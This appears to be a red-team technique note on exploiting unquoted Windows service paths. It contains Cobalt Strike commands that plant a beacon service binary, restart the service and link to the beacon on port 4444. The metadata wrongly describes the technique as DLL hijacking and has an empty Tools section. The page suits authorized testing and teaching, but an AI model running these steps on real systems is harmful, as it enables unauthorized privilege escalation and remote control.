# Unquoted Service Paths
An unquoted service path is where the path to the [[Windows Services]] binary is not wrapped in quotes and contains spaces.

## Conditions to exploit
1. Vuln-Service has spaces in the path and is also not quoted
2. Check permissions to write into the paths based on the search order
	1.  `C:\Program.exe`
	2.  `C:\Program Files\Vuln.exe`
	3.  `C:\Program Files\Vuln Service\Service.exe`
3. Generate malicious service binary. We can do this in Cobalt Strike via **Attacks > Packages > Windows Executable (S)** and selecting the **Service Binary** output type.
```````beacon
cd C:\Program Files\Vuln Service
upload C:\Payloads\beacon-tcp-svc.exe
mv beacon-tcp-svc.exe Service.exe
run sc stop Vuln-Service
run sc start Vuln-Service
```````

4. Check beacon and connect (if TCP listener is used)
``````
run netstat -anp tcp
[...snip...]
TCP    127.0.0.1:4444         0.0.0.0:0              LISTENING

connect localhost 4444
[+] established link to child beacon: 10.10.17.231
``````


## Tools
########
########


```meta
ttp: T1000
requirements: 
results: admin
description: Hijacking the search order hirarchy of a applications DLL.
```